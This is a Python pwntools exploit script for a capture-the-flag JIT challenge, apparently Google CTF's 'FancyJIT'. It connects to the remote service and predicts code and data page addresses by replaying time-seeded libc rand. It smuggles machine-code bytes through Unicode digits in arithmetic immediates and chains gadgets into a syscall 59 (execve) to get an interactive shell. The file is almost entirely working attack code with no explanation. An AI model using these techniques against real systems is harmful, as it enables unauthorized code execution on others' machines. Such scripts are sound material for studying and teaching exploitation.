#-*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

prog = [
"MOV({}, {})",
"ADD(A, {})",
"SUB(A, {})",
"CMP(A, {})",
"LDR({}, {})",
"STR({}, {})",
"SUM()",
"JMP({})",
"JEQ({})",
"JNE({})",
]

reg = [
"A",
"B",
]

def genAsm(i):
  rv = randint(0, 9)
  ga = prog[rv] 
  if rv == 6:
    return ga
  elif 'LDR' in ga or 'STR' in ga :
    return ga.format(reg[randint(0,1)], randint(0,30))
  elif 'ADD' in ga or 'SUB' in ga or 'CMP' in ga:
    return ga.format("+" + str(randint(0,99999)).rjust(30,"0"))
  elif 'MOV' in ga:
    return ga.format(reg[randint(0,1)], "+" + str(randint(0,99999)).rjust(30, "0"))
  elif 'JMP' in ga or 'JEQ' in ga or 'JNE' in ga:
    return ga.format(randint(i-20, i+20)) if i < 780 and i >20 else ga.format(i+1)
  else:
    assert (False)

def b2s (_c):
  c = ord(_c)
  res = c
  if c > 0x7f:
    res = -0x100 + c
  return res

def d2s (i):
  res = i & 0xffffffff
  if res > 0x7fffffff:
    res = (-0x100000000 + res) 
  return res

def intbracket (s):
  res = 0
  for c in s:
    res = d2s(res * 10 + b2s(c) - 0x30)
  return res

cdll_libc = CDLL ('libc.so.6')
#r = process ("java -Xmx200m -cp jna.jar:. FancyJIT".split (" "))
r = remote ("jit.ctfcompetition.com", 1337)


def rand_page ():
  res = 0
  for _ in xrange (3):
    res = ((res << 16) ^ cdll_libc.rand()) & 0xffffffffffffffff

  res = res & 0x7ffffffff000
  return res

for i in xrange(10):
  print i 
  cdll_libc.srand (cdll_libc.time(0)+i)
  text_addr = rand_page ()
  data_addr = rand_page ()
  print "text: " + hex(text_addr)
  print "data: " + hex(data_addr)
cdll_libc.srand (cdll_libc.time(0)+9)
text_addr = rand_page ()
data_addr = rand_page ()

xchg_gadget = u'\u0f20009101\u06f7'.encode('utf-8')
bb = u'\u0de600000002959\u0668'.encode('utf-8') # 0x6e69ffee ; need - 40383
ss = u'\ua9000000005842\u096f'.encode('utf-8') # 0x68ff21i; need - 35826
movrdi = u'\u0a66006820\u0d6f'.encode('utf-8')
movrsp = u'\uff100000006096\u0662'.encode('utf-8')
jump = u'\u1b5016'.encode('utf-8')

asms = """
MOV(B, 50014)
MOV(B, 50010)
MOV(B, 1295)
JMP(6)
MOV(B, {movrdi})
RET()
ADD(A, 1)
STR(A, 4)
MOV(B, {text_hi})
STR(B, 5)
ADD(A, 5)
STR(A, 8)
STR(B, 9)
ADD(A, 5)
STR(A, 12)
STR(B, 13)
ADD(A, 11)
STR(A, 2)
STR(B, 3)
MOV(A, {bb})
SUB(A, 40383)
STR(A, 0)
MOV(A, {ss})
SUB(A, 35826)
STR(A, 1)
MOV(A, 59)
JMP({jump})
MOV(B, {movrsp})
RET()
""".format(text_hi=u32(p64(text_addr)[4:]), movrsp=movrsp, movrdi=movrdi, bb=bb, ss=ss, jump=jump).strip()

r.recvuntil ("the result:")
r.sendline (asms)
r.sendline ("")
print "text: " + hex(text_addr)
print "data: " + hex(data_addr)
r.interactive ()
